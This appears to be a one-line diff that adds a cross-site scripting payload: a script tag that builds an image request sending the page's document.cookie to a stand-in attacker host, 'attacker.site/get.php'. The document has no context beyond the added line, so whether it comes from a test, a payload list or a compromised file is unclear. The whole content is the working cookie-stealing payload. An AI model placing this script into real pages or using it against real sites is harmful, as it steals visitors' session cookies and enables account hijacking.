@@ -1,0 +1,1 @@
+<script>var i = new Image(); i.src="http://attacker.site/get.php?cookie="+escape(document.cookie)</script>
